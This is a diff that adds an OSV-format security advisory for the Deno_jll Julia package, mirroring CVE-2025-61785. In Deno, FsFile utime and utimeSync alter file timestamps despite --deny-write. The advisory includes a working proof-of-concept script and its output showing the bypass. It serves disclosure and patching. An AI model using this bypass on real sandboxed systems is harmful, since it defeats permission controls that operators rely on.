@@ -1,0 +1,109 @@
+{
+    "schema_version": "1.7.4",
+    "id": "JLSEC-2026-111",
+    "modified": "2026-04-14T13:10:46.494Z",
+    "published": "2026-04-14T13:10:46.494Z",
+    "upstream": [
+        "EUVD-2025-31878",
+        "CVE-2025-61785",
+        "GHSA-vg2r-rmgp-cgqj"
+    ],
+    "summary": "Deno's --deny-write check does not prevent permission bypass",
+    "details": "### Summary\n\n`Deno.FsFile.prototype.utime` and `Deno.FsFile.prototype.utimeSync` are not limited by the permission model check `--deny-write=./`.\n\nIt's possible to change to change the access (`atime`) and modification (`mtime`) times on the file stream resource even when the file is opened with `read` only permission (and `write`: `false`) and file write operations are not allowed (the script is executed with `--deny-write=./`).\n\nSimilar APIs like `Deno.utime` and `Deno.utimeSync` require `allow-write` permission, however, when a file is opened, even with read only flags and deny-write permission, it's still possible to change the access (`atime`) and modification (`mtime`) times, and thus bypass the permission model.\n\n### PoC\n\nSetup:\n\n```\ndeno --version\ndeno 2.4.2 (stable, release, x86_64-unknown-linux-gnu)\nv8 13.7.152.14-rusty\ntypescript 5.8.3\n\ntouch test.txt\n```\n\n```js\n// touch test.txt\n// https://docs.deno.com/api/deno/~/Deno.FsFile.prototype.utime\n// deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 1\nasync function poc1(){\n    using file = await Deno.open(\"./test.txt\", { read: true, write: false});\n\n    const fileInfoBefore = await file.stat();\n    \n    await file.utime(new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n    \n    const fileInfoAfter = await file.stat();\n    \n    \n    console.log(`BEFORE (utime)`)\n    console.log(new Date(fileInfoBefore.mtime).getFullYear())\n    console.log(new Date(fileInfoBefore.atime).getFullYear())\n    \n    \n    console.log(`AFTER (utime)`)\n    console.log(new Date(fileInfoAfter.mtime).getFullYear())\n    console.log(new Date(fileInfoAfter.atime).getFullYear())\n}\n\n\n// https://docs.deno.com/api/deno/~/Deno.FsFile.prototype.utimeSync\n// deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 2\nfunction poc2(){\n    using file = Deno.openSync(\"./test.txt\", { read: true, write: false});\n\n    const fileInfoBefore = file.statSync();\n    \n    file.utimeSync(new Date(\"2001-01-01\"), new Date(\"2001-01-01\"));\n    \n    const fileInfoAfter = file.statSync();\n    \n    \n    console.log(`BEFORE (utimeSync)`)\n    console.log(new Date(fileInfoBefore.mtime).getFullYear())\n    console.log(new Date(fileInfoBefore.atime).getFullYear())\n    \n    \n    console.log(`AFTER (utimeSync)`)\n    console.log(new Date(fileInfoAfter.mtime).getFullYear())\n    console.log(new Date(fileInfoAfter.atime).getFullYear())\n}\n\n// https://docs.deno.com/api/deno/~/Deno.utime\n// deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 3\nasync function poc3(){\n    // not executed\n    await Deno.utime(\"./test.txt\", new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n}\n\n// https://docs.deno.com/api/deno/~/Deno.utimeSync\n// deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 4\nfunction poc4(){\n    // not executed\n    Deno.utimeSync(\"./test.txt\", new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n}\n\n\nasync function main(){\n    const poc = Deno.args[0] || 1;\n\n    const status = await Deno.permissions.query({ name: \"write\", path: \"./\" });\n    console.log(status);\n    switch (poc) {\n        case \"1\":\n            poc1()\n            break;\n        case \"2\":\n            poc2()\n            break;\n        case \"3\":\n            poc3()\n            break;\n        case \"4\":\n            poc4()\n            break;\n        default:\n            poc1()\n    }\n}\n\nmain()\n```\n\nOutput:\n\n  - `deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 1`\n\n```\nPermissionStatus { state: \"denied\", onchange: null }\nBEFORE (utime)\n2025\n2025\nAFTER (utime)\n2000\n2000\n```\n\n  - `deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 2`\n\n```\nPermissionStatus { state: \"denied\", onchange: null }\nBEFORE (utimeSync)\n2000\n2000\nAFTER (utimeSync)\n2001\n2001\n```\n\n  - `deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 3`\n\n```\nPermissionStatus { state: \"denied\", onchange: null }\nerror: Uncaught (in promise) NotCapable: Requires write access to \"./test.txt\", run again with the --allow-write flag\n    await Deno.utime(\"./test.txt\", new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n               ^\n    ...\n```\n\n  - `deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 4`\n\n```\nPermissionStatus { state: \"denied\", onchange: null }\nerror: Uncaught (in promise) NotCapable: Requires write access to \"./test.txt\", run again with the --allow-write flag\n    Deno.utimeSync(\"./test.txt\", new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n         ^\n    ...\n```\n\n### Impact\n\nPermission model bypass",
+    "severity": [
+        {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+        }
+    ],
+    "affected": [
+        {
+            "ranges": [
+                {
+                    "type": "SEMVER",
+                    "events": [
+                        {
+                            "introduced": "0"
+                        },
+                        {
+                            "fixed": "2.6.3+0"
+                        }
+                    ]
+                }
+            ],
+            "package": {
+                "ecosystem": "Julia",
+                "name": "Deno_jll",
+                "purl": "pkg:julia/Deno_jll?uuid=04572ae6-984a-583e-9378-9577a1c2574d"
+            }
+        }
+    ],
+    "references": [
+        {
+            "type": "WEB",
+            "url": "https://github.com/denoland/deno/commit/992e998dfe436cdc9325232759af8be92f11739b"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/denoland/deno/pull/30872"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/denoland/deno/releases/tag/v2.2.15"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/denoland/deno/releases/tag/v2.5.3"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/denoland/deno/security/advisories/GHSA-vg2r-rmgp-cgqj"
+        },
+        {
+            "type": "WEB",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-61785"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/advisories/GHSA-vg2r-rmgp-cgqj"
+        }
+    ],
+    "credits": [
+        {
+            "name": "dellalibera",
+            "contact": [
+                "https://github.com/dellalibera"
+            ],
+            "type": "REPORTER"
+        }
+    ],
+    "database_specific": {
+        "license": "CC-BY-4.0",
+        "sources": [
+            {
+                "id": "CVE-2025-61785",
+                "imported": "2026-04-14T12:58:55.162Z",
+                "modified": "2025-10-16T18:12:40.397Z",
+                "published": "2025-10-08T01:15:32.847Z",
+                "url": "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-61785",
+                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-61785"
+            },
+            {
+                "id": "GHSA-vg2r-rmgp-cgqj",
+                "imported": "2026-04-14T12:59:00.666Z",
+                "modified": "2025-10-13T15:17:43Z",
+                "published": "2025-10-07T22:36:36Z",
+                "url": "https://api.github.com/advisories/GHSA-vg2r-rmgp-cgqj",
+                "html_url": "https://github.com/advisories/GHSA-vg2r-rmgp-cgqj"
+            },
+            {
+                "id": "EUVD-2025-31878",
+                "imported": "2026-04-14T12:58:57.176Z",
+                "modified": "2025-10-08T18:59:12Z",
+                "published": "2025-10-08T00:37:01Z",
+                "url": "https://euvdservices.enisa.europa.eu/api/enisaid?id=EUVD-2025-31878",
+                "html_url": "https://euvd.enisa.europa.eu/vulnerability/EUVD-2025-31878"
+            }
+        ]
+    }
+}
